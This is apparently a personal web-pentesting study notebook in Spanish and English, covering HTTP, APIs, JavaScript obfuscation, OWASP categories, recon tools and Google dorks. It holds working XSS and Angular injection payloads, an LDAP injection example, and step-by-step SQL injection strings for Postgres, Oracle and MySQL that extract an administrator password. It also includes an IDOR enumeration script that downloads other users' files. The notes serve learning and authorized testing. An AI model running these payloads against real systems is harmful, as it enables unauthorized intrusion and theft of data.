# HACKING WEB APPLICATION:

## Tipos:
Web application security testing:
  - Vulnerability scanning
  - Pentesting
  - Code review and static analysis

# Requests and responses:
## cache-control directives:
- public: the response can be cached by anu intermediary, such as proxy.
- private: specificies that the response is intended for a specific user and not be cached.
- non-cache: instructs the client to revalidate the response.
- no-store: directs the client and intermediate caches not to store any version of the response
- max-age=<seconds>: maximoum amount of time in seconds that the response can be cached by the client, after must be revalidated with the server

# Tecnologias:

## HTML:
- Etiquetado sin estado.
- HTTP 1.0:
  - Antiguo y con menos ventajas
- HTTP 1.1:
  - Más mordeno y permite enviar más "request" o información sobre la misma conexión.

## APIs:
### Web Service Architecture:
Arquitecture SOA:
- Service provider: Manejador de la pagina web.
- Service requester: Quien manda a pedir la información.
- Service registry: Fichero que nos da guia de como usar la conexión.

Más sin embargo existen dos estructuras basicas:
- SOAP: Si requiere un Service registry, son más robustas y basadas en XML, usan dos Service Registry:
  - UDDI: Catalgo de servicios, es decir "CurrencyExchangeService", "DemoExchangeService", etc.
  - WSDL: Despues de escoger en el UDDI por ejemplo comprar, hay un WSDL que explica los metodos especificos y que parametros debemos enviar.
  - WS-Security: Encargado de mantener segura la conexión, como el manejo de sesiones.
- RESTFul: Son mas simples, no requieren Service Registry, y pueden ser XML y JSON (más comun).

- EJEMPLOS REQUEST SOAP:
```
POST /currencyConversionService HTTP/1.1
Host: example.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "ConvertCurrency"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:cur="http://example.com/currency">
    <soapenv:Header/>
    <soapenv:Body>
        <cur:ConvertCurrencyRequest>
            <cur:fromCurrency>USD</cur:fromCurrency>
            <cur:toCurrency>EUR</cur:toCurrency>
            <cur:amount>100</cur:amount>
        </cur:ConvertCurrencyRequest>
    </soapenv:Body>
</soapenv:Envelope>
```
- RESPUESTA SOAP:
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:cur="http://example.com/currency">
    <soapenv:Header/>
    <soapenv:Body>
        <cur:ConvertCurrencyResponse>
            <cur:fromCurrency>USD</cur:fromCurrency>
            <cur:toCurrency>EUR</cur:toCurrency>
            <cur:amount>100</cur:amount>
            <cur:convertedAmount>85</cur:convertedAmount>
        </cur:ConvertCurrencyResponse>
    </soapenv:Body>
</soapenv:Envelope>
```

- EJEMPLO REQUEST RESTFUL:
```
GET /api/convert?from=USD&to=EUR&amount=100 HTTP/1.1
Host: example.com
```
- RESPUESTA RESTFUL:
```
{
  "fromCurrency": "USD",
  "toCurrency": "EUR",
  "amount": 100,
  "convertedAmount": 85
}
```

### Tipos de request de API a BD:
CRUD Api y REST Api usan los tipos de acciones a realizar sobre la BD en base del tipo de Request por ejemplo:

| Operation	| HTTP Method	| Description |
| ----------| ------------|-------------|
| Create | POST	| Adds the specified data to the database table |
| Create | POST	| Only adds the specified data to the database table if the registry dosn't exist |
| Read | GET	| Reads the specified entity from the database table |
| Update	| PUT	| Updates the data of the specified database table |
| Patch	| PUT	| Updates partially the data of the specified database table |
| Delete	| DELETE	| Removes the specified row from the database table |

## JavaScript:
Es el motor de accionables de las paginas web, por llamarlo de una forma burda.

* Herramienta para correr javascript: https://jsconsole.com/

### Basics:
- Nota clave:
  - Interactua con el DOM, crear y enviar request.
  - Corre usualmente en una sandbox dentro del navegador.
  - JS es usado a nivel cliente, pero tambien existe Node.JS creado para tambien ser usado del lado del servidor.
  - Es sensible a mayusculas, y es secuencial, es decir que solo se ejecuta cuando se manda a llamar por un evento o que el navegador se encuentra con el durante la ejecución.
 
- Codigo basico:
  - alert("mensaje"); (mensaje)
  - window.location.replace("https://mydomain.com"); (redirección)
  - document.write("mensaje sobre el html") (escribe en pantalla)

- payloads:
  - https://github.com/payloadbox/xss-payload-list
 
- Lugares donde puede correr js:
  - Etiqueta general:
```
    - <script> directamente etiquetando al codigo
```
  - Dentro de etiquetas como evento:
```
    - <img src=x onerror=alert(1)> dentro de una etiqueta
```
  - Dentro de un atributos tipo URI:
```
    - <a href="javascript:alert(1)">
    - <iframe src="javascript:alert(1)">
    - <iframe srcdoc="<script>alert(1)</script>">
    - <a href="data:text/html,<script>alert(1)</script>"> (este ya no es un payload confiable porque los navegadores lo bloquean)
```
 
### JQuery:
- Usualmente las paginas usan frameworks de desarrollo que ayudan a hacer más intuitivo el desarrollo de las aplicaciones, en este caso existe jquery que facilitan el desarrollo. JQuery estandariza la forma en la que interacturamos con los objetos.
- Ejemplo:
```
<html>
  <head>
  </head>
  <body>
      <script src=https://code.jquery.com/jquery-3.7.1.min.js></script> //Importamos la libreria
      <script src=main.js></script> //Importamos el script de nosotros que va a trabajar con jquery
      <h1>Hola</h1>
      <p id="parrafo-primero">Como estas?</p>
      <a href="/previo">regresar</a>
      <button id="primer-boton">Haz click</button>
  </body>
</html>
```
```
$(document).ready(function(){ // Esto hace que el codigo se ejecute hasta que finalice la carga de la pagina
  // su manejo es similar a css
    // $(p) hara referencia a todas los parrafos de html
    // $(#parrafo-primero) hara referencia al objeto con el id parrafo-primero
    // $(.clase-primera) hace referencia a las clases llamadas clase-primero

  // ejemplo de como se colorea los parrafos
    $(p).css({background-color:"red"});
  // ejemplo de manejo de eventos
    $(#primer-boton).click(function(){
      alert(hola!)
    }
  // ejemplo de como js recibe un parametro lo lee del get y lo imprime en el atributo href
    $('#parrafo-primero').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
)}
```

### Angular:
Framework de basado en MVC para javascript, que permite manipular objetos sin necesidad de escribir javascript directamente, que puedes mandar a llamar por atributos a los elementos con ng-*=""

NOTA: Angular 1.x es obsoleto hoy en día y blanco facil de ataques, 2.x es su reemplazo actual.

Versiones antiguas de 1.x permiten inyecciones faciles de realizar, como inyectar lo siguiente:
```
{{constructor.constructor('alert(1)')()}}
```

- Condiciones para vulnerar angular:
  - Que el script de angular sea cargado <script src=angular.min.js>
  - El body tenga la etiqueta <body ng-app>
  - Debe estar dentor de una etiqueta <span>codigoxss</span>
  - Debe estar dentro de un atributo especifico de angular como ng-href="codigoxss" o ng-src href="codigoxss"


### Ofuscation:
Proceso en hacer más complicado la lectura del codigo de javascript, basado en herramientas que en automatico alteran la estructura del codigo.

NOTA: Aunque en realida mayormente es usado para realizar evasión, dado que al final de cuentas al estar del lado del cliente puede ser des-ofuscado por lo que no es 100% su uso para ocultar información sensible.

* Herramienta: https://beautifytools.com/javascript-obfuscator.php

-Ejemplo:
```
console.log('HTB JavaScript Deobfuscation Module');
```
-Ofuscado: 
```
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1.0(\'2 3 4 5\');',6,6,'log|console|HTB|JavaScript|Deobfuscation|Module'.split('|'),0,{}))
```

Pero sí notamos aún podemos leer ciertos strings, para hacerlo más avanzando podemos usar otros metodos:
* Herramienta: https://obfuscator.io/

-Ejemplo: 
```
function hi() {
  console.log("Hello World!");
}
hi();
```
-Ofuscado: 
```
function _0x15e5(){var _0x515653=['67005aTWsQS','1565285NYTRGL','Hello\x20World!','182388LLwVFH','291882PwzBRj','12vNdABm','8ZcDJJv','log','10327009vSgTVQ','2VtJPZV','698362NTltuH','315430nnFMBQ','160qkLRFj','4YJBzfZ'];_0x15e5=function(){return _0x515653;};return _0x15e5();}(function(_0x5abee1,_0x312ba7){var _0x405874=_0x2642,_0x194f40=_0x5abee1();while(!![]){try{var _0x36b8f9=parseInt(_0x405874(0xf9))/0x1*(-parseInt(_0x405874(0xfb))/0x2)+-parseInt(_0x405874(0xf3))/0x3*(parseInt(_0x405874(0xfd))/0x4)+-parseInt(_0x405874(0xf1))/0x5+-parseInt(_0x405874(0xf4))/0x6+parseInt(_0x405874(0xfa))/0x7*(parseInt(_0x405874(0xf6))/0x8)+-parseInt(_0x405874(0xfe))/0x9*(parseInt(_0x405874(0xfc))/0xa)+parseInt(_0x405874(0xf8))/0xb*(parseInt(_0x405874(0xf5))/0xc);if(_0x36b8f9===_0x312ba7)break;else _0x194f40['push'](_0x194f40['shift']());}catch(_0x1ed409){_0x194f40['push'](_0x194f40['shift']());}}}(_0x15e5,0x2c51f));function hi(){var _0x407016=_0x2642;console[_0x407016(0xf7)](_0x407016(0xf2));}function _0x2642(_0x496bea,_0x2dc7c){var _0x15e568=_0x15e5();return _0x2642=function(_0x2642a3,_0x473985){_0x2642a3=_0x2642a3-0xf1;var _0x40f79e=_0x15e568[_0x2642a3];return _0x40f79e;},_0x2642(_0x496bea,_0x2dc7c);}hi();
```

Hay metodos cada vez más complicados y rebuscados, que claro terminaria afectando demasiado el performance de una aplicación como:

https://jsfuck.com/
https://utf-8.jp/public/jjencode.html
https://utf-8.jp/public/aaencode.html

Estos ya son metodos que son más dirigidos a evadir controles y realizar ataques de javascript.

### Deofuscation:
Proceso de reversing de la ofuscation:

* Herramienta para acomodar el codigo: https://prettier.io/playground/
* Directamente trata de desofuscar: https://matthewfl.com/unPacker.html

### Minify:
Metoodo más popular que la "ofuscation" dado que es usado para reducir el tamaño del codigo, es más util cuando se trata de codigo muy largo.
El estandar para avisar que un archivo esta em minify es colocar .min.js al final del fichero.

* Herramienta: https://www.toptal.com/developers/javascript-minifier

- Ejemplo:
```
function log(){
console.log('HTB JavaScript Deobfuscation Module');
}
```
- Minified:
```
function log(){console.log("HTB JavaScript Deobfuscation Module")}
```

### Encoding:
Recuerda encoding no es cifrado :) es solo encodear.

- Base64: Su caracteristica principal es que debe estar en grupos de 4, sino rellena con =, por eso a veces vemos al final este caracter
- HEX: Anotación de hexadecimal equivalente a una letra, que dependera de que encoding estemos usando como ASCCI o UTF8
- rot13: No tan usado, pero es una variación del viejo cifrado cesar

## Common Web Vulnerability:
OWASP Top Ten:

A01 – Broken Access Control
- Funciones o accesos mal implementados y que pueden ser accedidos los recursos cuando no deberia. (Basado en vulnerar el proceso ya con permisos asignados pero mal aplicados)
A02 – Cryptographic Failures
- Exposición de datos sin cifrar o con algoritmos debiles, no solo en la comunicación sino tambien en funciones de hash como MD5, usar base64, etc.
A03 – Injection
- Inyección de parametros maliciosos, como:
  - SQLI: Parametros de sql dentro de inputs.
  - Commands: Ejecución de comandos a nivel OS.
  - LDAP: En ocasiones una autenticación puede enviarse a traves de una consulta tipo LDAP, donde pedimos user y pass, y concatenamos.
    - QUERY NORMAL: (&(uid=<username>)(userPassword=<password>))
    - INYECCIÓN EN INPUT: username=admin)(uid=*)
    - QUERY MALICIOSO: (&(uid=admin)(userPassword=<password>)(uid=*)) similar a con sql, hara un all.
  - XSS: Ejecución de scripts maliciosos del lado del usuario.
  - Server-Side JS Injection
  - Server-Side Includes Injection
  - Server-Side Template Injection
  - Log Injection
  - HTML Injection
  - CRLF Injection
  - JNDI Injection
A04 – Insecure Design
- Problema de diseño de la aplicación, es decir la logica de su funcionalidad no fue diseña pensando en seguridad, como parametros sin sanitizar, falta de permisos granulares.
A05 – Security Misconfiguration
- Mal configuración del servicio expuesto, como permitir lectura de errores en ambientes productivos.
A06 – Vulnerable and Outdated Components
- Uso de software antiguo.
A07 – Identification and Authentication Failures
- Problemas en el proceso de identificación o autenticación, como contraseñas debiles o sesiones inseguras. (Basado en vulnerar el proceso durante la asignación de permisos mal aplicados)
A08 – Software and Data Integrity Failures
- Pemitir la modificación de datos de forma cuando no deberia ser permitido.
  - Ataques de deserialización: La serialización es empaquetar información, por ejemplo <user>hh2</user> pasarlo a encodear y enviarlo al cliente, sí este paquete al ser manipulado por el atacante no es validado al ser enviado de nuevo al servidor, el servidor podria leer que no es hh2 sino otro con otros permisos.
A09 – Security Logging and Monitoring Failures
- Problema de registros y monitoreo de fallas.
A10 – Server-Side Request Forgery (SSRF)
- Abusar de que se permita enviar peticiones desde un servidor a otros.

## Reconocimiento:
- Whois:  
  -  REVERSE WHOIS: Lo más importabte es correlacionar el owner, y del owner saber que otro sitios a registrado en caso de ser publica la información
    -  https://viewdns.info/reversewhois
    -  https://www.whoxy.com/
- DNS Pasivo:
  - https://dnsdumpster.com/
  - https://github.com/owasp-amass/amass
- Google dorks:
  - Siempre revisar google, yahoo, duckduckgo y bing, google hoy en día ya casi no guarda mucho, no todos soportan filtros:
    > site: – Restringe la búsqueda a un dominio específico.
    > intitle: – Busca palabras clave en el título de la página.
    > inurl: – Busca palabras clave en la URL.
    > filetype: – Busca archivos de un tipo específico.
    > ext: – Alternativa a filetype:, también busca extensiones de archivo.
    > intext: – Busca texto dentro del contenido de la página.
    > allinurl: – Busca todas las palabras especificadas en la URL.
    > allintitle: – Busca todas las palabras especificadas en el título. Ejemplo: allintitle:index of
    > allintext: – Busca todas las palabras especificadas en el contenido. Ejemplo: allintext:username password
    > cache: – Muestra la versión en caché de una página por Google. Ejemplo: cache:example.com
    > link: – Muestra páginas que enlazan a una URL específica (limitado por Google). Ejemplo: link:example.com
    > related: – Muestra sitios similares a uno especificado. Ejemplo: related:example.com
    > define: – Busca definiciones de palabras (más útil para análisis semántico que pentest). Ejemplo: define:token
    > AROUND(X) – Busca dos términos separados por X palabras. Ejemplo: "password" AROUND(5) "username"
    > " (comillas dobles) – Busca una frase exacta. Ejemplo: "Welcome to admin panel"

- Scrap:
  - python3 ReconSpider.py http://domain.com
- Burpsuite:
  - Discovery content module.
- spiderfoot:
  - https://github.com/smicallef/spiderfoot
  - sudo apt install spiderfoot
  - spiderfoot -l localhost:50001
- finalrecon:
  - ./finalrecon.py --headers --whois --url http://inlanefreight.com
- Nikto: 
  - nikto -h inlanefreight.com -Tuning b (Modulo de reconocimiento)

## WAF Detection:
- wafw00f -a domain.com

# Clonación del sitio:
Util sino tienes burpsuite pro y necesitas revisar el codigo de la pagina
- htttrack

## Web attacks:
Tipos de ataques web.

### Burpsuite tips:
  - Settings > UserInterface > Message editor > change html message size
  - Guardar la configuración creada para siempre se aplique a nuevos proyectos
  - Live audit and live crawl:
    - Decirle que audite tambien repiter e intruder es util.
    - Modificar para que tambien audite "light audit" y "javascript analysis" es muy util dado que sera más proactivo sin ser demasiado intrusivo
  - Extensiones interesantes:
    - inQL: grafica el introspection de graphql para entregarte cada petición lista para usarse en repeter
    - 403 bypasser: puedes mandarle directamente a que haga un scan rapido

### HTTP Verb Tampering:
- Insecure Configurations:
  - Limitar acceso a información por el tipo de Metodo, por ejemplo panel de autenticación podria limitar el acceso solo a PUT y GET, podria permitir al menos leer las cabeceras que regresen HEAD, o sí ejecuta una acción permite que se ejecute por detras.
```
<Limit GET POST>
    Require valid-user
</Limit>
```
- Insecure Coding:
  - Realizar sanitización especificando parametros solo de GET, pero despues recibir parametros sin importar el metodo, por ejemplo:
```
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) { #VALIDA QUE EL PARAMETRO DE GET VENGA LIMPIO )
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'"; #(EJECUTA EL PARAMETRO RECIBIDO SIN IMPORTAR SINO VIENE POR GET)
    ...SNIP...
}
```

## XSS:
- Tipos:
  - Reflejada: El cliente envia información, el servidor a la hora de procesarla regresa el HTML con JS inyectado.
  - Almacenada: El cliente envia información, el servidor almacena la info, y a la hora de procesarla nuevamente regresa el HTML con JS inyectado.
  - DOM: El cliente envia información, el servidor procesa y regresa la información, pero cliente procesa la información recibida mediante una función de javascript en el navegador, y el script de js inyecta codigo en el DOM.
    -> Ejemplo clasico: document.getElementById("output").innerHTML = location.hash;
    -> Inyecta lo que venga en el # en un objeto sin sanitizar, ejemplo: http://example.com/page.html#<script>alert(1)</script>
 
- Objetivos:
  - Robo de cookies
  - Browser exploitation
  - Keyloggin
  - Phishing: Fake forms
 
- Puntos basicos de inyección:
  - Atributos: onmouseover=alert()
  - href usando URI: href=javascript:alert()
  - Etiqueta HTML: <script>...
```
  <a id=parrafonormal onmouseover=alert() href=javascript:alert()>
  <script>alert...
```

### Ataques al DOM:
El DOM es la interfaz real de la pagina creada para HTML Y XML, es el esqueleto que es modificado por JS y HTML, entonces en este caso puede ser un XSS reflejado o almacenado pero que tiene como objetivo modificar el DOM por parte de un script en el cliente de JS.

IMPORTANTE: Se considera un XSS de tipo DOM cuando es enviado el request, se ejecuta en el servidor y regresa el html normal, y despues al ingresar la respuesta al navegador JS modifica el DOM del lado del cliente, y no proviene ya asi el HTML malicioso del servidor. 

¿En si que es el DOM?:
- DOM: (document)
  - Root element <html>
    - <Head>
      - <title>
    - <body>
      - element: <a> <h1>
        - attribute: "href"
        - attribute: "style"

- Scripts basicos para modificar el DOM:
  - Modificar contenido
```
    - document.querySelector("#name_t816bq").value = "ever<br>";
    - document.getElementById("demo").innerHTML = "I have changed!<br>"; NOTA: existe otra función llamada .getinnerText() solo inyecta texto ingorando html
```
  - Modificar un atributo
```
    - document.getElementById("myAnchor").href = "https://www.w3schools.com";
    - document.getElementById("myAnchor").contenteditable = "true";
    - document.write("Ejecución exitosa gracias: " + var_name) escritura general de cualquier cosa dentro del documento
```
  - Lectura de parametros:
```
    - URLSearchParams(window.location.search)).get('search'); busca el contenido del parametro search
    - decodeURIComponent(window.location.hash); regresa el valor de #valor de la url
    - // .slice(1)); busca y regresa el valor de # eliminando el primer caracter, un valor de 2 eliminaria primeros 2
```

#### Atacar eval()
  - Sí la variable es enviada a un eval, es muy suceptible a ser inyectada, dado que permite que eval es generico, ejecuta todo lo que se envie como variable, sin importar que sea.
```
    -> URL: https://doc.com/?stat=alert(document.cookie)
    - var stat = document.URL.split("stat=")[1];
    - eval(stat);
```
  - Va a ejecutar el alert, cuando posiblemente solo esperaba recibir una simple suma
     
#### Vulnerabilidades en jquery tipo DOM:

Muchas de las veces el problema es que justamente nos facilita la vida encapsulando funciones, que mandamos a llamar, pero sí las funciones jquery son inseguras o no dan por sentado que nosotros haremos sanitización, al enviar información jquery podria generar xss.

- CVE-2012-6708: Selector interpreted as HTML
   - Este codigo hara una busqueda para ver si hay H2 que contienen la palabra recibida en la URL /#seccion, el problema es que este tipo de funciones se les llama selectores (:contains) y lo que reciba en el selector va a ejecutarlo como html, dado que para realizar la busqueda va a crear un clon de la pagina en DOM inyectando incluido lo recibido en /#seccion, al ejecutar el DOM clonado tambien ejecutara lo recibido como tags de html.
     
```
$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
```
  - POC:
```
https://domain.com/#<img src=x onerror=alert()>
```

### Automatizado:
- xsser -url "https://domain.com/?pop=show" -p "target_host=XSS"
- xsser -url "https://domain.com/?pop=show" -p "target_host=XSS" --Fp "<script>alert("")</script> (ataque especifico)
- xsser --gtk (grafical interfaz)

## SQLInjection:
Los comandos de SQL en ocasiones son conctanados dentro del codigo de la aplicación web, la concatenación es literal copiar y pega el comando y mandarlo a ejecutar, entonces sí ademas copia dentro del comando valores no sanitizados, esto conlleva a que se ejecute lo que nosotros le digamos, elimiando el comando esperado.

### DBMS:
- Tipos de bases de datos:
  - Relacionales: Tienen conexiones entre las trablas llamadas llaves primarias y foraneas, que facilitan la conexión y relación entre la información que contienen.
| id\_usuario | nombre   | email                                       | edad |
| ----------- | -------- | ------------------------------------------- | ---- |
| 1           | Ana Ruiz | [ana@example.com](mailto:ana@example.com)   | 28   |
| 2           | Juan Gil | [juan@example.com](mailto:juan@example.com) | 34   |
  - No relacionales: Usada en información sin tanta estructura y relación entre datos, haciendolas más flexibles y rapidas, pero complejas en relacionamiento de datos.
```
{
  "_id": "u1",
  "nombre": "Ana Ruiz",
  "email": "ana@example.com",
  "edad": 28,
  "direccion": {
    "calle": "Av. Central 123",
    "ciudad": "Madrid",
    "postal": "28001"
  }
}
```
  - Orientado a objetos: No guarda la información en tablas y columnas, sino que directamente al objeto lo guardas en una BD sin descomponerlo en columnas.
```
//// Creación del objeto
public class Usuario {
    private String nombre;
    private String email;
    private int edad;

    public Usuario(String nombre, String email, int edad) {
        this.nombre = nombre;
        this.email = email;
        this.edad = edad;
    }

    // Getters y setters...
}

//// Almacenar el objeto
ObjectContainer db = Db4o.openFile("usuarios.db"); // Abre la base de datos
Usuario u = new Usuario("Ana", "ana@email.com"); //Setea los valores
db.store(u); // Guarda el objeto completo en disco
db.close(); // Cierra la base de datos
```

### Comandos clave SQL:
' or "                   Cierre y apertura de valores
/* sql... */             Comentarios multilinea
\+                       Concatenación
\# --                    Comentarios de una linea
||                       Concatenación
%                        Indicador de atributo
@variable                Variable local
@@variable               Variable global
waitfor delay '00:00:10' Sleep

### Tipos de sqli:

#### In-Band:
- Error based: En base a provocar errores aparte de ser la forma más directa de conocer que existe un SQLI, se puede provocar errores por ejemplo de casteo, donde regresa el valor sí hubo un problema en su conversión de string a integer.

  - Posgres:

1- Provocar el error: Con un simple mal cierre del query, se puede producir el error
```sql
    '
```

2- Error basico: Este cast deberia provocar que regrese un string pero el espera un integer, entonces mostrara el valor a en pantalla, tambien puedes hacer lo mismo para provocar que se muestre la versión
```sql
    ' AND 1=CAST((SELECT 'a') AS int)--
    ' AND 1=CAST((SELECT version()) AS int)--
```

3- Información de columnas y tablas: Mismo paso donde puedes traer datos tipo integer y luego verlos como un error.
```sql
    ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- 
```

- Union based: Se une una segunda tabla al actual query, donde la segunda tabla sirve de pivote para saltar a más información.
  - ORACLE:

1- Detectar la cantidad de campos que tiene la tabla actual:
  - Opción 1: Incrementar el groupby hasta que se detecte en que numero se provoca un error.
```sql
      GROUP BY 1--
      GROUP BY 2--
```
  - Opción 2: Incrementar la cantidad de null hasta encontrar donde se provoca el error.
```sql
      ' UNION SELECT NULL FROM DUAL--
      ' UNION SELECT NULL,NULL FROM DUAL--
      ' UNION SELECT NULL,NULL,NULL FROM DUAL--
```
2- Conocer el tipo de valor de cada campo, colocando varios tipos hasta encontrar uno que sea string, dado que es el más facil de manipular:
```sql
      ' UNION SELECT 'A',NULL,NULL FROM DUAL--
      ' UNION SELECT NULL,'A',NULL FROM DUAL--
      ' UNION SELECT NULL,NULL,'A' FROM DUAL--
```
3- Comenzar a regresar información relevante como versiones, nombre de BD, incluso tablas:
```sql
    -- VERSION:
      SELECT banner,NULL,NULL FROM v$version
      SELECT version,NULL,NULL FROM v$instance
    -- NOMBRE DE LAS TABLAS:
      ' UNION SELECT owner,table_name,NULL FROM all_tables--
    -- NOMBRE DE LAS COLUMNAS:
      ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES'--
      ' UNION SELECT column_name,table_name FROM all_tab_columns--
```
#### Blind:
- Boleean based:
  - Basado en que provocar errores o ver sí existe diferencia en la respuesta del servidor a ejecutar querys con errores o valores especificos.

  - Postgres mensaje en pantalla:

1- Comportamiento: Detectar comportamientos basados en la respuesta como, por ejemplo sí el servidor regresa un "welcome" cuando el query regresa al menos una fila, o sí viene vacio no muestra el mensaje.
  -> Muestra el mensaje por regresar un campo:
```sql
  ' OR 1=1--
```
  -> No muestra el mensaje por no tener un campo valido:
```sql
  ' OR 2=1--
```

2- Validar en base a función sencilla conociendo el tamaño de variable:
```sql
  a' OR LENGTH(CURRENT_USER) = 5--
```

3- Calcular tamaño del campo:
```sql
  a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '____________________'--
```

4- Conocer el valor del campo:
```sql
    a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$'--
```

  - ORACLE Provocar errores
1- Provocar calculos invalidos como dividir entre 0:
  -> Payload 1: numeros 1 al tamaño del campo
  -> payload 2: caracteres y numeros
```sql
    a' OR (SELECT CASE WHEN (SUBSTR(password,$payload1$,1)='$payload2$') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') = 'a'-- 
```

- Time based:
  - Es en base a una función boleana, donde sí el tiempo de espera a la respuesta es mayor a la normal, significa que evalua la función como true y manda a hacer un sleep, o función que ralentiza su ejecución.
    - MYSQL:

1 - Posición: Dependiendo de en que posición de la ejecución, pero los payloads más sencillos para mysql v5 es:
```sql
      -- CAMPOS:
        Select $<SLEEP(5)> FROM users;
      -- WHERE:
        SELECT * FROM users WHERE username = '$<' OR SLEEP(5)--> -';
      -- ORDER BY:
        SELECT * FROM users ORDER BY $<IF(1=1, SLEEP(5), 1)>;
      -- HAVING:
        SELECT COUNT(\*) FROM users GROUP BY role HAVING COUNT(*) > 0 $<OR SLEEP(5)>;
      -- LIMIT:
        SELECT * FROM users LIMIT 1 $<OFFSET (SELECT SLEEP(5))>;
      -- IN:
        SELECT * FROM users WHERE id IN $<(SELECT id FROM users WHERE SLEEP(5))>;
      -- UPDATE:
        UPDATE users SET email = '$payload' WHERE id = 1; $payload= test@example.com', SLEEP(5), email='test2@example.com
      -- INSERT:
        INSERT INTO logs (message) VALUES ('$payload'); $payload= x'), (SLEEP(5)), ('y
```
2 - Validar: A partir de aquí primero debemos ejecutar una función donde validaremos que podemos hacer validaciones boleanas, con una función que en teoria casi siempre deberia funcionar, por ejemplo esta función va a hacer sleep sí encuentra que database contiene algun caracter:
```sql
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '%')#
```
3 - Contar caracteres: Podemos usar like '__' para ir incrementandolo hasta encontrar la cantidad de caracteres correcta:
```sql
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '__')# Sí falso = no esperar tiempo
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '___')# Sí verdadero = espera 1 segundo
```
4 - Adivinar caracteres: Usando "Intruder" y "Sniper Attack", incrustamos el mismo payload con caracteres o numeros, y en "Resouce Pool" solo ponemos un "request" como maximo y solo buscamos los que tarden más en responder

```sql
      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '$_$$_$$_$')#
```

 - Postgres:

1- Validaciones basicas: La posición dependera mucho de donde va la inyección, no se puede ejecutar sleep directamente sin validaciones, el más basico por ejemplo puede ser:
```sql
      ' AND pg_sleep(5) IS NULL --
```

2- Condicionales: Ejecución de espera
  -> payload 1: numeros incrementales
  -> payload 2: caracteres y numeros
```sql
      a' OR (SELECT CASE WHEN (SUBSTRING(password,$payload1$,1)='$payload2$') THEN pg_sleep(5) ELSE 'a' END FROM users WHERE username='administrator') IS NULL--
```

#### Out of Band:
- HTTP/DNS responses


## IDOR:
Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.

- URL Parameters, JSON & APIs:
  - El más simple, userid=1000&credencial=ine.pdf, modificamos el userid y vemos otras credenciales.
- AJAX or JS Calls:
  - Funciones ocultas en javascript o ajax que no deberian poder ser llamadas, por ejemplo sí estamos en un panel normal donde hay un login para empleados, pero existe un parametro oculto llamado is_admin, que pasaria sí le dijieramos si somos admin en vez de no somos?
```
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
- Understand Hashing/Encoding
  - Bastante comun que las referencias son encodeadas o hasheadas como metodo de ocultar la información, pero que si conocemos la estructura y función usada podemos tambien modificar los datos.
  - ?filename=ZmlsZV8xMjQucGRm (BASE64) -> ?filename=file_124.pdf
  - Sino podemos saber que función se está usando podriamos tratar de verlo en JS Ajax.
```
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
- Compare User Roles:
  - Sí tenemos la posibilidad de crear varios usuarios podriamos ver diferencias de valores o variables en los parametros entre cada usuario, intentando usar el valor del segundo usuario creado, no todos los parametros son tan obvios que son la referencia a otro usuario.
```
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/d100/salaries/15ab"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
  - Por ejemplo sí notamos que el valor entre services y salaries es un valor variable que sí modificamos nos tre información de otro servicio de otro usuario.

- Herramientas: Lo más sencillo es usar intruder, pero en ciertas certs o sino tenemos la licencia se podria complicar, una forma manual seria:
  - curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
    - Buscamos patrones donde aparezca información relacionada a otros usuarios, pero para hacerlo automatizado podemos:
```
#!/bin/bash

url="http://SERVER_IP:PORT"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```














